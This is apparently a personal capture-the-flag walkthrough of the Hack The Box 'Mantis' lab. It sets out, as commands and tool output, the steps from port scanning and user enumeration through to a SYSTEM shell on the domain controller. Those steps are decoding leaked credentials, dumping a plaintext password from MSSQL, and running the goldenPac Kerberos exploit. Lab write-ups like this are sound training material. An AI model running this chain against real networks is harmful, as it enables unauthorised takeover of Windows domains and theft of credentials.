## NMAP SCAN 
```
nmap -sSCV -p- 10.129.197.236                                             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-05 20:47 +0700
Nmap scan report for 10.129.197.236
Host is up (0.078s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-05 08:18:27Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.197.236:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info: 
|   10.129.197.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-05T08:13:13
|_Not valid after:  2056-05-05T08:13:13
|_ssl-date: 2026-05-05T08:19:49+00:00; -5h30m00s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Tossed Salad - Blog
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49170/tcp open  msrpc        Microsoft Windows RPC
49173/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2026-05-05T08:19:49+00:00; -5h30m00s from scanner time.
| ms-sql-info: 
|   10.129.197.236:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
| ms-sql-ntlm-info: 
|   10.129.197.236:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-05T08:13:13
|_Not valid after:  2056-05-05T08:13:13
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2026-05-05T08:19:26
|_  start_date: 2026-05-05T08:13:09
|_clock-skew: mean: -4h55m42s, deviation: 1h30m43s, median: -5h30m00s
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2026-05-05T04:19:24-04:00
```

```
kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.197.236

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/05/26 - Ronnie Flathers @ropnop

2026/05/05 15:28:14 >  Using KDC(s):
2026/05/05 15:28:14 >   10.129.197.236:88

2026/05/05 15:28:14 >  [+] VALID USERNAME:       james@htb.local
2026/05/05 15:28:17 >  [+] VALID USERNAME:       James@htb.local
2026/05/05 15:28:30 >  [+] VALID USERNAME:       administrator@htb.local
2026/05/05 15:28:42 >  [+] VALID USERNAME:       mantis@htb.local
2026/05/05 15:29:08 >  [+] VALID USERNAME:       JAMES@htb.local
2026/05/05 15:30:07 >  [+] VALID USERNAME:       Administrator@htb.local
2026/05/05 15:31:02 >  [+] VALID USERNAME:       Mantis@htb.local

```

3 users only... 
lets check website on 8080
nothing here... lets dir enum...
```
gobuster dir -u http://10.129.197.236:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40                 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.197.236:1337
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
orchard              (Status: 500) [Size: 3026]
secure_notes         (Status: 301) [Size: 163] [--> http://10.129.197.236:1337/secure_notes/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```

![[Pasted image 20260505141815.png]]

```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
   
   Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

admin:@dm!n_P@ssW0rd!
lets have a look 
```
dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
```
file has something encoded lets crack it too
```
m$$ql_S@_P@ssW0rd!
```

lets try to connect to mssql

```
python3 mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.129.197.236'                
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000)
[!] Press help for extra shell commands
```

the 2nd password works.... 
```
SQL (admin  admin@orcharddb)> SELECT table_name FROM information_schema.tables;

table_name                                             
----------------------------------------------------   
blog_Orchard_Blogs_RecentBlogPostsPartRecord           
blog_Orchard_Blogs_BlogArchivesPartRecord              
blog_Orchard_Workflows_TransitionRecord                
blog_Orchard_Workflows_WorkflowRecord                  
blog_Orchard_Workflows_WorkflowDefinitionRecord        
blog_Orchard_Workflows_AwaitingActivityRecord          
blog_Orchard_Workflows_ActivityRecord                  
blog_Orchard_Tags_TagsPartRecord                       
blog_Orchard_Framework_DataMigrationRecord             
blog_Orchard_Tags_TagRecord                            
blog_Orchard_Tags_ContentTagRecord                     
blog_Settings_ContentFieldDefinitionRecord             
blog_Orchard_Framework_DistributedLockRecord           
blog_Settings_ContentPartDefinitionRecord              
blog_Settings_ContentPartFieldDefinitionRecord         
blog_Settings_ContentTypeDefinitionRecord              
blog_Settings_ContentTypePartDefinitionRecord          
blog_Settings_ShellDescriptorRecord                    
blog_Settings_ShellFeatureRecord                       
blog_Settings_ShellFeatureStateRecord                  
blog_Settings_ShellParameterRecord                     
blog_Settings_ShellStateRecord                         
blog_Orchard_Framework_ContentItemRecord               
blog_Orchard_Framework_ContentItemVersionRecord        
blog_Orchard_Framework_ContentTypeRecord               
blog_Orchard_Framework_CultureRecord                   
blog_Common_BodyPartRecord                             
blog_Common_CommonPartRecord                           
blog_Common_CommonPartVersionRecord                    
blog_Common_IdentityPartRecord                         
blog_Containers_ContainerPartRecord                    
blog_Containers_ContainerWidgetPartRecord              
blog_Containers_ContainablePartRecord                  
blog_Title_TitlePartRecord                             
blog_Navigation_MenuPartRecord                         
blog_Navigation_AdminMenuPartRecord                    
blog_Scheduling_ScheduledTaskRecord                    
blog_Orchard_ContentPicker_ContentMenuItemPartRecord   
blog_Orchard_Alias_AliasRecord                         
blog_Orchard_Alias_ActionRecord                        
blog_Orchard_Autoroute_AutoroutePartRecord             
blog_Orchard_Users_UserPartRecord                      
blog_Orchard_Roles_PermissionRecord                    
blog_Orchard_Roles_RoleRecord                          
blog_Orchard_Roles_RolesPermissionsRecord              
blog_Orchard_Roles_UserRolesPartRecord                 
blog_Orchard_Packaging_PackagingSource                 
blog_Orchard_Recipes_RecipeStepResultRecord            
blog_Orchard_OutputCache_CacheParameterRecord          
blog_Orchard_MediaProcessing_ImageProfilePartRecord    
blog_Orchard_MediaProcessing_FilterRecord              
blog_Orchard_MediaProcessing_FileNameRecord            
blog_Orchard_Widgets_LayerPartRecord                   
blog_Orchard_Widgets_WidgetPartRecord                  
blog_Orchard_Comments_CommentPartRecord                
blog_Orchard_Comments_CommentsPartRecord               
blog_Orchard_Taxonomies_TaxonomyPartRecord             
blog_Orchard_Taxonomies_TermPartRecord                 
blog_Orchard_Taxonomies_TermContentItem                
blog_Orchard_Taxonomies_TermsPartRecord                
blog_Orchard_MediaLibrary_MediaPartRecord              
blog_Orchard_Blogs_BlogPartArchiveRecord               
SQL (admin  admin@orcharddb)> SELECT UserName, Password FROM blog_Orchard_Users_UserPartRecord;
UserName   Password                                                               
--------   --------------------------------------------------------------------   
admin      AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   
James      J@m3s_P@ssW0rd!
```

got james pass from
James : J@m3s_P@ssW0rd!

```
nxc smb 10.129.197.244 -u James -p 'J@m3s_P@ssW0rd!'
SMB         10.129.197.244  445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.197.244  445    MANTIS           [+] htb.local\James:J@m3s_P@ssW0rd! 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.197.244 -u James -p 'J@m3s_P@ssW0rd!' --shares
SMB         10.129.197.244  445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.197.244  445    MANTIS           [+] htb.local\James:J@m3s_P@ssW0rd! 
SMB         10.129.197.244  445    MANTIS           [*] Enumerated shares
SMB         10.129.197.244  445    MANTIS           Share           Permissions     Remark
SMB         10.129.197.244  445    MANTIS           -----           -----------     ------
SMB         10.129.197.244  445    MANTIS           ADMIN$                          Remote Admin
SMB         10.129.197.244  445    MANTIS           C$                              Default share
SMB         10.129.197.244  445    MANTIS           IPC$                            Remote IPC
SMB         10.129.197.244  445    MANTIS           NETLOGON        READ            Logon server share 
SMB         10.129.197.244  445    MANTIS           SYSVOL          READ            Logon server share 
```
no interesting folder except SYSVOL
```
rusthound-ce -d htb.local -u James@htb.local    
---------------------------------------------------
Initializing RustHound-CE at 16:25:34 on 05/05/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-05T09:25:34Z INFO  rusthound_ce] Verbosity level: Info
[2026-05-05T09:25:34Z INFO  rusthound_ce] Collection method: All
Password: 
[2026-05-05T09:25:37Z INFO  rusthound_ce::ldap] Connected to HTB.LOCAL Active Directory!
[2026-05-05T09:25:37Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-05-05T09:25:37Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-05T09:26:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=htb,DC=local
[2026-05-05T09:26:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-05T09:26:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=htb,DC=local
[2026-05-05T09:26:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-05T09:26:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=htb,DC=local
[2026-05-05T09:26:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-05T09:26:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=htb,DC=local
[2026-05-05T09:26:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-05T09:26:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=htb,DC=local
[2026-05-05T09:26:27Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-05-05T09:26:27Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-05-05T09:26:27Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 5 users parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_users.json created!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 50 groups parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_groups.json created!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_computers.json created!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_ous.json created!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_domains.json created!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_gpos.json created!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] 67 containers parsed!
[2026-05-05T09:26:27Z INFO  rusthound_ce::json::maker::common] .//20260505162627_htb-local_containers.json created!

RustHound-CE Enumeration Completed at 16:26:27 on 05/05/26! Happy Graphing!
```

now lets have a look at bloodhound.. 
so james is a member of remote desktop so we can rdp 
got to know that we can use goldenPac and get admin shell... https://fzuckerman.wordpress.com/2016/10/09/knock-and-pass-kerberos-exploitation/
```
goldenPac.py -dc-ip 10.129.197.244 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
/usr/local/bin/goldenPac.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250919.210843.8426ec99', 'goldenPac.py')
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller 10.129.197.244
[*] 10.129.197.244 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file KZAtHPGF.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service EiLI on mantis.htb.local.....
[*] Starting service EiLI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type C:\Users\james\Desktop\user.txt
da6529f4e3a25343cf08b0860fa5cc56

C:\Windows\system32>type C:\Users\Administrator\Desktop\user.txt
b'The system cannot find the file specified.\r\n'
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
32d1fa2dd40df8b626758d912afdf6f7
```
we got root and user flag